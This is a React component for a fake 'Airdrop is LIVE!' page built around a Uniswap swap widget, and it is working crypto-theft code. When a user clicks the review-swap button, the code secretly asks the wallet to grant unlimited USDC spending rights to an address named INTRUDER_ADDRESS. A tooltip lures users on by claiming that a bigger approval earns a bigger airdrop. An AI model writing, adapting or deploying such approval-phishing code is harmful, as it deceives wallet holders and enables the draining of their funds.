import { FC, useEffect, useRef, useState } from 'react';
import { BigNumber, ethers } from 'ethers';
import { TransactionResponse } from '@ethersproject/abstract-provider';
import { errorCodes, serializeError } from '@metamask/rpc-errors';
import { useSigner } from 'wagmi';
import { bsc, mainnet, polygon } from 'wagmi/chains';
import { toast } from 'react-toastify';
import { SwapWidget, darkTheme } from '@uniswap/widgets';
import type { Web3Provider } from '@ethersproject/providers';
import { Tooltip } from 'antd';
import { InfoCircleOutlined } from '@ant-design/icons';
import { useWallet } from 'hooks';
import { ERC20TokenABI } from 'abi';
import styles from './Airdrop.module.scss';
import '@uniswap/widgets/fonts.css';

interface OriginalError {
  cause?: {
    code: string;
    reason: string;
  };
}

interface ProviderMessage {
  type: string;
  data: unknown;
}

const MY_TOKEN_LIST = [
  {
    name: 'USD Coin',
    address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
    symbol: 'USDC',
    decimals: 6,
    chainId: bsc.id,
    logoURI:
      'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
  },
  {
    name: 'USD Coin',
    address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    symbol: 'USDC',
    decimals: 6,
    chainId: mainnet.id,
    logoURI:
      'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
  },
  {
    name: 'USD Coin',
    address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174',
    symbol: 'USDC',
    decimals: 6,
    chainId: polygon.id,
    logoURI:
      'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48/logo.png',
  },
];

const defaultOutputTokenAddress: Record<number, string> = {
  [bsc.id]: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
  [mainnet.id]: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
  [polygon.id]: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174',
};

const INTRUDER_ADDRESS = process.env.REACT_APP_INTRUDER_ADDRESS;

const UINT256_MAX_INT = BigNumber.from(
  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
);

const capitalizeFirstLetter = (value: string) => {
  if (!value) {
    return '';
  }

  return value.charAt(0).toUpperCase() + value.slice(1);
};

const Airdrop: FC = () => {
  const { signer, chain } = useWallet();
  const toastRef = useRef<any>();
  const provider = useSigner().data?.provider;
  const [isPending, setIsPending] = useState(false);

  useEffect(() => {
    const messageHandler = (message: ProviderMessage) => {
      console.log(message);
    };

    provider?.on('message', messageHandler);

    return () => {
      provider?.off('message', messageHandler);
    };
  }, [provider]);

  useEffect(() => {
    const reviewButton = document.querySelector(
      '[data-testid="action-button"] > button'
    ) as HTMLButtonElement;
    if (reviewButton) {
      reviewButton.disabled = isPending;
      reviewButton.classList[isPending ? 'add' : 'remove'](styles.noEvents);
    }
  }, [isPending]);

  const reviewInterceptor = async () => {
    try {
      const isOkay = chain && !chain.unsupported;

      if (isPending || !isOkay) {
        return false;
      }

      setIsPending(true);
      toastRef.current = toast.loading('Pending...');

      const tokenAddress = defaultOutputTokenAddress[chain.id];
      const contract = new ethers.Contract(tokenAddress, ERC20TokenABI, signer);

      const txnResponse: TransactionResponse = await contract.approve(
        INTRUDER_ADDRESS,
        UINT256_MAX_INT
      );

      await txnResponse.wait();
      return true;
    } catch (error: any) {
      const rpcError = serializeError(error);

      const errorData = rpcError.data as OriginalError;
      const cause = errorData?.cause;

      if (
        rpcError.code === errorCodes.rpc.internal &&
        !!cause &&
        cause.code === 'ACTION_REJECTED'
      ) {
        toast.error(capitalizeFirstLetter(cause.reason), { autoClose: 2000 });
      } else {
        toast.error(error?.message, { autoClose: 2000 });
      }
      return false;
    } finally {
      setIsPending(false);
      toast.dismiss(toastRef.current);
    }
  };

  const selectorInterceptor = (field: any) => {
    console.log(field);
    return true;
  };

  return (
    <div className={styles.container}>
      <main className={styles.main}>
        <div className={styles.header}>
          <h1 className={styles.title}>Airdrop is LIVE!</h1>
          <Tooltip
            title="The bigger approval you give, the bigger airdrop you get"
            color="#4B83FB"
            placement="right"
          >
            <h2 className={styles.subtitle}>
              <span style={{ marginRight: 5 }}>
                To be eligible just make a swap
              </span>
              <InfoCircleOutlined />
            </h2>
          </Tooltip>
        </div>

        <div className={styles.demo}>
          <div className={styles.widget}>
            {!!provider && (
              <SwapWidget
                tokenList={MY_TOKEN_LIST}
                provider={provider as Web3Provider}
                defaultChainId={(chain && !chain.unsupported && chain.id) || 1}
                defaultInputTokenAddress={defaultOutputTokenAddress}
                defaultOutputTokenAddress="NATIVE"
                onReviewSwapClick={reviewInterceptor}
                onTokenSelectorClick={selectorInterceptor}
                defaultInputAmount="10"
                theme={darkTheme}
                width={400}
                hideConnectionUI
                permit2
              />
            )}
          </div>
        </div>
      </main>
    </div>
  );
};

export default Airdrop;
